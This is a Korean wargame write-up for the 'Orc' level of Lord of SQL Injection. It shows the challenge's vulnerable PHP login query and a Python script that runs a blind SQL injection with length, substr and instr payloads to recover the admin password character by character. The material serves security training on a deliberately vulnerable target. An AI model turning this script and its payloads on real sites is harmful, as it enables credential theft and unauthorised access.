---
layout: default
title: Orc
parent: Load Of SQL Injection
nav_order: 4
---

# Orc

문제에서 pw를 구해서 넣는 방식을 요구하고 있다.

Blind SQL Injection을 이용해 직접 PW를 구해 넣으면 된다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

Python 툴로 만들어 실행하면 된다.

```python
import urllib, urllib2, cookielib, re, ssl
key=''
length=0
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders={('User-agent','Mozila/5.0(compatible;MSIE 5.5;Windows NT)')}

loginUrl2='https://los.eagle-jump.org/?login'
login_form={"id":"los_id","pw":"los_pw"}
login_form=urllib.urlencode(login_form)
reqLogin = opener.open('https://los.eagle-jump.org/?login',login_form)
url = 'https://los.eagle-jump.org/gate.php'
req=opener.open(url)

print 'start Blind SQL Injection'
print "search key's length"
while 1:
    length=length+1
    url = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw='or length(pw)=%d and instr(id,'admin')%%23"%(length)
    print url
    resp=opener.open(url)
    rresp=resp.read()
    find=re.findall("Hello admin",rresp)
    if find:
        break
print length

print 'search key.'
lenck=1
while 1:
    subkey = 31
    for x in range(96):
        subkey=subkey+1
        hexkey=hex(subkey);
	if hexkey=="0x25":
		subkey=subkey+1
		hexkey=hex(subkey)
        url="https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw='or substr(pw,%d,1)=%s and instr(id,'admin')%%23" %(lenck,hexkey)
        print url
        resp=opener.open(url)
        rresp=resp.read()
        find=re.findall("Hello admin",rresp)
        if find:
            print 'find'
            key=key+chr(subkey)
            break
    lenck=lenck+1
    if lenck-1==length:
        break

print 'find key.'
print key.lower()
```